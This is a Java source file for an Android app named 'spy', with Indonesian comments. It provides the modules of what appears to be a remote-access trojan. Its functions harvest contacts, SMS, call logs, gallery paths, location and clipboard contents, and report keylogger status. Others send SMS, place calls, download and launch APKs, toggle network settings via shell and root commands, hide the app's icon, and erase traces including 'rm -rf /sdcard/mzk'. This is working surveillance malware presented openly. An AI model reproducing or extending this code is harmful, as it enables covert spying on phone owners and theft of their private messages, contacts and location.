package ai.m4zk1play.spy;

import android.annotation.SuppressLint;
import android.app.WallpaperManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.Base64;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/** Modul perangkat: dump, kontrol, utilitas. */
public final class Modules {

    public static JSONObject info(Context c) {
        JSONObject o = new JSONObject();
        try {
            o.put("brand", Build.BRAND);
            o.put("model", Build.MODEL);
            o.put("android", Build.VERSION.RELEASE);
            o.put("sdk", Build.VERSION.SDK_INT);
            o.put("battery", battery(c));
            o.put("charging", charging(c));
            o.put("ip", ip(c));
            o.put("notif", NotifListener.alive());
            o.put("keylog", KeylogService.alive());
            o.put("a11y", KeylogService.alive());
            o.put("can_write", Settings.System.canWrite(c));
            o.put("root", root());
        } catch (Exception ignored) {
        }
        return o;
    }

    public static int battery(Context c) {
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager)
                    c.getSystemService(Context.BATTERY_SERVICE);
            return bm == null ? 0 : bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Exception e) { return 0; }
    }

    public static boolean charging(Context c) {
        try {
            Intent i = c.registerReceiver(null,
                    new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            int s = i == null ? -1 : i.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
            return s == android.os.BatteryManager.BATTERY_STATUS_CHARGING
                    || s == android.os.BatteryManager.BATTERY_STATUS_FULL;
        } catch (Exception e) { return false; }
    }

    @SuppressLint("MissingPermission")
    public static String ip(Context c) {
        try {
            WifiManager wm = (WifiManager) c.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            int i = wm == null ? 0 : wm.getConnectionInfo().getIpAddress();
            return String.format(Locale.US, "%d.%d.%d.%d",
                    i & 0xff, (i >> 8) & 0xff, (i >> 16) & 0xff, (i >> 24) & 0xff);
        } catch (Exception e) { return ""; }
    }

    public static boolean root() {
        String out = Shell.exec("su -c id");
        return out != null && out.contains("uid=0");
    }

    public static JSONObject location(Context c) {
        JSONObject o = new JSONObject();
        try {
            LocationManager lm = (LocationManager) c.getSystemService(Context.LOCATION_SERVICE);
            Location best = null;
            for (String p : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER}) {
                try {
                    Location l = lm.getLastKnownLocation(p);
                    if (l != null && (best == null || l.getTime() > best.getTime())) best = l;
                } catch (Exception ignored) { }
            }
            if (best != null) {
                o.put("lat", best.getLatitude());
                o.put("lon", best.getLongitude());
                o.put("acc", best.getAccuracy());
                o.put("provider", best.getProvider());
            }
        } catch (Exception ignored) { }
        return o;
    }

    public static JSONArray contacts(Context c) {
        JSONArray arr = new JSONArray();
        try (android.database.Cursor cur = c.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null)) {
            while (cur != null && cur.moveToNext() && arr.length() < 8000) {
                JSONObject o = new JSONObject();
                o.put("name", cur.getString(0));
                o.put("number", cur.getString(1));
                arr.put(o);
            }
        } catch (Exception ignored) { }
        return arr;
    }

    public static JSONArray sms(Context c) {
        JSONArray arr = new JSONArray();
        try (android.database.Cursor cur = c.getContentResolver().query(Uri.parse("content://sms"),
                new String[]{"address", "body", "date", "type"}, null, null, "date DESC")) {
            while (cur != null && cur.moveToNext() && arr.length() < 8000) {
                JSONObject o = new JSONObject();
                o.put("from", cur.getString(0));
                o.put("body", cur.getString(1));
                o.put("ts", cur.getLong(2));
                o.put("type", cur.getInt(3));
                arr.put(o);
            }
        } catch (Exception ignored) { }
        return arr;
    }

    public static JSONArray calls(Context c) {
        JSONArray arr = new JSONArray();
        try (android.database.Cursor cur = c.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
                        CallLog.Calls.DATE, CallLog.Calls.DURATION}, null, null, "date DESC")) {
            while (cur != null && cur.moveToNext() && arr.length() < 8000) {
                JSONObject o = new JSONObject();
                o.put("number", cur.getString(0));
                o.put("type", cur.getInt(1));
                o.put("ts", cur.getLong(2));
                o.put("dur", cur.getLong(3));
                arr.put(o);
            }
        } catch (Exception ignored) { }
        return arr;
    }

    public static JSONArray gallery(Context c, int limit) {
        JSONArray arr = new JSONArray();
        try (android.database.Cursor cur = c.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME,
                        MediaStore.Images.Media.SIZE, MediaStore.Images.Media.DATE_ADDED,
                        MediaStore.Images.Media.DATA},
                null, null, "date_added DESC")) {
            while (cur != null && cur.moveToNext() && arr.length() < limit) {
                JSONObject o = new JSONObject();
                o.put("id", cur.getLong(0));
                o.put("name", cur.getString(1));
                o.put("size", cur.getLong(2));
                o.put("ts", cur.getLong(3));
                o.put("path", cur.getString(4));
                arr.put(o);
            }
        } catch (Exception ignored) { }
        return arr;
    }

    public static JSONArray apps(Context c) {
        JSONArray arr = new JSONArray();
        try {
            for (android.content.pm.ApplicationInfo ai : c.getPackageManager()
                    .getInstalledApplications(0)) {
                JSONObject o = new JSONObject();
                o.put("pkg", ai.packageName);
                o.put("name", String.valueOf(c.getPackageManager().getApplicationLabel(ai)));
                o.put("system", (ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0);
                arr.put(o);
            }
        } catch (Exception ignored) { }
        return arr;
    }

    public static String clip(Context c) {
        try {
            ClipboardManager cm = (ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip()) return "";
            ClipData d = cm.getPrimaryClip();
            if (d == null || d.getItemCount() == 0) return "";
            return String.valueOf(d.getItemAt(0).coerceToText(c));
        } catch (Exception e) { return ""; }
    }

    public static void setWallpaper(Context c, String url) throws Exception {
        HttpURLConnection cn = (HttpURLConnection) new URL(url).openConnection();
        cn.setConnectTimeout(15000);
        try (InputStream in = cn.getInputStream()) {
            Bitmap bmp = BitmapFactory.decodeStream(in);
            if (bmp != null) WallpaperManager.getInstance(c).setBitmap(bmp);
        }
    }

    public static void vibrate(Context c, long ms) {
        try {
            Vibrator v = (Vibrator) c.getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) v.vibrate(ms);
        } catch (Exception ignored) { }
    }

    public static void volume(Context c, int level) {
        try {
            AudioManager am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
            if (am == null) return;
            am.setStreamVolume(AudioManager.STREAM_MUSIC,
                    Math.max(0, Math.min(level, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC))), 0);
        } catch (Exception ignored) { }
    }

    public static boolean brightness(Context c, int pct) {
        int raw = Math.max(1, Math.min(255, pct * 255 / 100));
        try {
            if (Settings.System.canWrite(c)) {
                Settings.System.putInt(c.getContentResolver(),
                        Settings.System.SCREEN_BRIGHTNESS_MODE,
                        Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL);
                Settings.System.putInt(c.getContentResolver(),
                        Settings.System.SCREEN_BRIGHTNESS, raw);
                return true;
            }
        } catch (Exception ignored) { }
        return false;
    }

    public static boolean wifi(Context c, boolean on) {
        try {
            WifiManager wm = (WifiManager) c.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            return wm != null && wm.setWifiEnabled(on);
        } catch (Exception e) { return false; }
    }

    public static void data(Context c, boolean on) {
        Shell.exec("svc data " + (on ? "enable" : "disable"));
    }

    public static void airplane(Context c, boolean on) {
        if (root()) {
            Shell.exec("su -c settings put global airplane_mode_on " + (on ? 1 : 0));
            Shell.exec("su -c am broadcast -a android.intent.action.AIRPLANE_MODE");
        } else {
            Shell.exec("settings put global airplane_mode_on " + (on ? 1 : 0));
        }
    }

    public static boolean online(Context c) {
        try {
            ConnectivityManager cm = (ConnectivityManager) c.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return false;
            android.net.NetworkInfo ni = cm.getActiveNetworkInfo();
            return ni != null && ni.isConnected();
        } catch (Exception e) { return false; }
    }

    public static void screenOff(Context c) {
        Shell.exec("input keyevent 26");
    }

    public static void screenOn(Context c) {
        try {
            PowerManager pm = (PowerManager) c.getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;
            @SuppressWarnings("deprecation")
            PowerManager.WakeLock wl = pm.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "mzk:on");
            wl.acquire(8000);
            wl.release();
        } catch (Exception ignored) { }
    }

    public static void toast(Context c, String msg) {
        try { Toast.makeText(c, msg, Toast.LENGTH_LONG).show(); } catch (Exception ignored) { }
    }

    public static void dial(Context c, String number) {
        try {
            Intent i = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:" + number));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Exception ignored) { }
    }

    public static void call(Context c, String number) {
        try {
            Intent i = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Exception ignored) { }
    }

    public static void sms(Context c, String number, String body) {
        try {
            SmsManager sm = SmsManager.getDefault();
            sm.sendTextMessage(number, null, body, null, null);
        } catch (Exception ignored) { }
    }

    public static void uninstall(Context c, String pkg) {
        try {
            Intent i = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + pkg));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Exception ignored) { }
    }

    public static void openUrl(Context c, String url) {
        try {
            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Exception ignored) { }
    }

    /** Unduh APK lalu buka installer. */
    public static String install(Context c, String url) throws Exception {
        HttpURLConnection cn = (HttpURLConnection) new URL(url).openConnection();
        cn.setConnectTimeout(20000);
        File out = new File(c.getCacheDir(), "update_" + System.currentTimeMillis() + ".apk");
        try (InputStream in = cn.getInputStream(); FileOutputStream fo = new FileOutputStream(out)) {
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) fo.write(buf, 0, n);
        }
        Uri uri = Uri.parse("file://" + out.getAbsolutePath());
        Intent i = new Intent(Intent.ACTION_VIEW);
        i.setDataAndType(uri, "application/vnd.android.package-archive");
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
        c.startActivity(i);
        return out.getAbsolutePath();
    }

    public static void hideIcon(Context c, boolean hide) {
        try {
            int state = hide
                    ? android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                    : android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
            c.getPackageManager().setComponentEnabledSetting(
                    new android.content.ComponentName(c, MainActivity.class), state,
                    android.content.pm.PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) { }
    }

    public static String stamp() {
        return new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
    }

    /** Bersihkan jejak: cache, file unduhan, entri MediaStore milik kita. */
    public static JSONObject clean(Context c) {
        JSONObject r = new JSONObject();
        int files = 0;
        try {
            File cache = c.getCacheDir();
            File[] kids = cache.listFiles();
            if (kids != null) {
                for (File f : kids) if (del(f)) files++;
            }
            File ext = new File(c.getExternalFilesDir(null) == null
                    ? c.getFilesDir().getPath() : c.getExternalFilesDir(null).getPath());
            File[] kids2 = ext.listFiles();
            if (kids2 != null) {
                for (File f : kids2) if (del(f)) files++;
            }
            r.put("files", files);
        } catch (Exception ignored) { }

        try {
            int removed = c.getContentResolver().delete(
                    MediaStore.Files.getContentUri("external"),
                    MediaStore.Files.FileColumns.DATA + " LIKE ?", new String[]{"%/mzk/%"});
            r.put("media", removed);
        } catch (Exception ignored) { }

        try {
            int dl = c.getContentResolver().delete(
                    Uri.parse("content://downloads/my_downloads"), null, null);
            r.put("downloads", dl);
        } catch (Exception ignored) { }

        if (root()) {
            Shell.exec("su -c rm -rf /sdcard/mzk");
            r.put("root_clean", true);
        }
        return r;
    }

    private static boolean del(File f) {
        try {
            if (f.isDirectory()) {
                File[] k = f.listFiles();
                if (k != null) for (File x : k) del(x);
            }
            return f.delete();
        } catch (Exception e) { return false; }
    }

    public static String base64(byte[] data) {
        return Base64.encodeToString(data, Base64.NO_WRAP);
    }

    public static byte[] jpeg(Bitmap bmp, int q) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        bmp.compress(Bitmap.CompressFormat.JPEG, q, out);
        return out.toByteArray();
    }
}
